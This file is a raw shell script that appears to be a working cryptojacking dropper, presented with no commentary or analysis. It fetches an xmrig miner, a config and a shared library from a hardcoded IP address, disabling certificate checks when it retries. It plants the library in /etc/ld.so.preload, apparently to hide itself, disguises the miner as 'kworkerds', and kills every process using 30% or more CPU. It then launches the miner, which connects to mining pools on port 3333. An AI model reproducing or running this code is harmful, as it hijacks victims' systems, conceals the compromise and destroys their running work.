#!/bin/sh
DIR="/var/tmp"
if [ -a "/var/tmp/sustse" ]
then
    if [ -w "/var/tmp/sustse" ] && [ ! -d "/var/tmp/sustse" ]
    then
        if [ -x "$(command -v md5sum)" ]
        then
            sum=$(md5sum /var/tmp/sustse | awk '{ print $1 }')
            echo $sum
            case $sum in
                83d502512326554037516626dd8ef972 | 83d502512326554037516626dd8ef972)
                    echo "sustse OK"
                ;;
                *)
                    echo "sustse wrong"
                    rm -rf /usr/local/lib/libkk.so
                    echo "" > /etc/ld.so.preload
                    pkill -f wc.conf
                    pkill -f sustse
                    sleep 4
                ;;
            esac
        fi
        echo "P OK"
    else
        DIR=$(mktemp -d)/var/tmp
        mkdir $DIR
        echo "T DIR $DIR"
    fi
else
    if [ -d "/var/tmp" ]
    then
        DIR="/var/tmp"
    fi
    echo "P NOT EXISTS"
fi
if [ -d "/var/tmp/sustse" ]
then
    DIR=$(mktemp -d)/var/tmp
    mkdir $DIR
    echo "T DIR $DIR"
fi
WGET="wget -O"
if [ -s /usr/bin/curl ];
then
    WGET="curl -o";
fi
if [ -s /usr/bin/wget ];
then
    WGET="wget -O";
fi
f2="107.174.47.181"

downloadIfNeed()
{
    if [ -x "$(command -v md5sum)" ]
    then
        if [ ! -f $DIR/sustse ]; then
            echo "File not found!"
            download
        fi
        sum=$(md5sum $DIR/sustse | awk '{ print $1 }')
        echo $sum
        case $sum in
            83d502512326554037516626dd8ef972 | 83d502512326554037516626dd8ef972)
                echo "sustse OK"
            ;;
            *)
                echo "sustse wrong"
                sizeBefore=$(du $DIR/sustse)
                if [ -s /usr/bin/curl ];
                then
                    WGET="curl -k -o ";
                fi
                if [ -s /usr/bin/wget ];
                then
                    WGET="wget --no-check-certificate -O ";
                fi
                download
                sumAfter=$(md5sum $DIR/sustse | awk '{ print $1 }')
                if [ -s /usr/bin/curl ];
                then
                    echo "redownloaded $sum $sizeBefore after $sumAfter " `du $DIR/sustse` > $DIR/var/tmp.txt
                fi
            ;;
        esac
    else
        echo "No md5sum"
        download
    fi
}

download() {
    if [ -x "$(command -v md5sum)" ]
    then
        sum=$(md5sum $DIR/sustse3 | awk '{ print $1 }')
        echo $sum
        case $sum in
            83d502512326554037516626dd8ef972 | 83d502512326554037516626dd8ef972)
                echo "sustse OK"
                cp $DIR/sustse3 $DIR/sustse
				        cp $DIR/sustse3 $DIR/kworkerds
            ;;
            *)
                echo "sustse wrong"
                download2
            ;;
        esac
    else
        echo "No md5sum"
        download2
    fi
}

download2() {
    if [ `getconf LONG_BIT` = "64" ]
    then
    echo "" > /etc/ld.so.preload
    $WGET $DIR/sustse http://107.174.47.181/xmrig
    $WGET $DIR/wc.conf http://107.174.47.181/wc.conf
		$WGET $DIR/1.so http://107.174.47.181/1.so
    rm -rf /usr/local/lib/libkk.so
		cp /var/tmp/1.so /usr/local/lib/libkk.so
    echo "/usr/local/lib/libkk.so" > /etc/ld.so.preload
		cp /var/tmp/sustse /var/tmp/kworkerds
    fi
    if [ -x "$(command -v md5sum)" ]
    then
        sum=$(md5sum $DIR/sustse | awk '{ print $1 }')
        echo $sum
        case $sum in
            83d502512326554037516626dd8ef972 | 83d502512326554037516626dd8ef972)
                echo "sustse OK"
                cp $DIR/sustse $DIR/sustse3
            ;;
            *)
                echo "sustse wrong"
            ;;
        esac
    else
        echo "No md5sum"
    fi
}

judge() {
    if [ ! "$(netstat -ant|grep '185.161.70.34:3333\|202.144.193.184:3333\|205.185.122.99:3333'|grep 'ESTABLISHED'|grep -v grep)" ];
    then
        ps axf -o "pid %cpu" | awk '{if($2>=30.0) print $1}' | while read procid
	      do
	      kill -9 $procid
        done
        downloadIfNeed
        rm -rf /usr/local/lib/libkk.so
		    $WGET $DIR/sustse http://107.174.47.181/xmrig
		    $WGET $DIR/1.so http://107.174.47.181/1.so
        $WGET $DIR/wc.conf http://107.174.47.181/wc.conf
		    cp $DIR/1.so /usr/local/lib/libkk.so
        touch /etc/ld.so.preload
        echo "" > /etc/ld.so.preload
        echo "/usr/local/lib/libkk.so" > /etc/ld.so.preload
        pkill -f /var/tmp/java
        pkill -f wc.conf
        chmod +x $DIR/sustse
        nohup $DIR/sustse -c $DIR/wc.conf > /dev/null 2>&1 &
		    nohup $DIR/kworkerds -c $DIR/wc.conf > /dev/null 2>&1 &
        sleep 5
    else
       echo "Running"
    fi
}

judge2() {
    if [ ! "$(ps -fe|grep 'sustse'|grep 'wc.conf'|grep -v grep)" ];
    then
        downloadIfNeed
        chmod +x $DIR/sustse
		    nohup $DIR/sustse -c $DIR/wc.conf > /dev/null 2>&1 &
        nohup $DIR/kworkerds -c $DIR/wc.conf > /dev/null 2>&1 &
        sleep 5
    else
        echo "Running"
    fi
}

if [ ! "$(netstat -ant|grep 'LISTEN\|ESTABLISHED\|TIME_WAIT'|grep -v grep)" ];
then
    judge2
else
    judge
fi